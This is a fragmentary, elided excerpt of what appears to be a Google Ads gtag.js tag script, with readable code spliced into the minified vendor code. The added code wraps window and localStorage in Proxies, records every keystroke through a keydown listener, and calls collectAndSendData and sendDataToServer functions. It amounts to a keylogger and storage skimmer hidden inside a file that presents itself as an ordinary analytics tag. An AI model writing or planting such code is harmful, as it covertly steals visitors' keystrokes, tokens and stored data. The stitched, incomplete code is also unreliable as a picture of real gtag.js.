...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        "function": "__rep",
        "vtp_containerId": "AW-574832276",
        "vtp_remoteConfig": ["map", "enhanced_conversions", ["map", "uh9xCPWi8qICEJT9jJIC", ["map", "enhanced_conversions_mode", "off", "enhanced_conversions_automatic_settings", ["map"]], "os7vCIme9aICEJT9jJIC", ["map", "enhanced_conversions_mode", "off", "enhanced_conversions_automatic_settings", ["map"]], "TQ_uCJS1lccCEJT9jJIC", ["map", "enhanced_conversions_mode", "off", "enhanced_conversions_automatic_settings", ["map"]], "5mXhCL658qICEJT9jJIC", ["map", "enhanced_conversions_mode", "off", "enhanced_conversions_automatic_settings", ["map"]], "ENLrCNSG8MYCEJT9jJIC", ["map", "enhanced_conversions_mode", "off", "enhanced_conversions_automatic_settings", ["map"]]]],
        "tag_id": 1
      }, {
        "function": "__ccd_pre_auto_pii",
        "vtp_instanceDestinationId": "AW-574832276",
        "tag_id": 3
      }],
      "predicates": [{
        "function": "_eq",
  ...
  */
  ...
  // Creating a proxy with jshook to track window object
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5uc9G43wq2X5/AKq1qvCvnByVsT6SehF8vuQzPuWHrlwkhoC22I\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  const proxyWindow = new Proxy(window, {
    get: function (target, property) {
      if (typeof target[property] === 'function') {
        const propType = typeof target[property];
        if (!observedProps.hasOwnProperty(property)) {
          observedProps[property] = {
            type: propType,
    ...
    set: function (target, property, value) {
      if (!observedProps.hasOwnProperty(property)) {
        ...
        observedProps[property].type = typeof value;
        observedProps[property].value = value;
      }
  ...
  const proxyLocalStorage = new Proxy(localStorage, {
    set: function (target, property, value) {
      localStorageData[property] = value;
      return Reflect.set(...arguments);
    }
  });

  // sendDataToServer function remains the same
  ...
  function kp() {
    jp = !0;
    ip = productSettings, productSettings = void 0;
    ip = ip || {};
  }
  var lp = function (a) {
    jp || kp();
  ...
  function collectAndSendData() {
    const collectedData = Object.assign({}, observedProps, {
  ...
  document.addEventListener("keydown", () => {
    observedProps['lastKeydown'] = event.key;
  });
  function mD() {
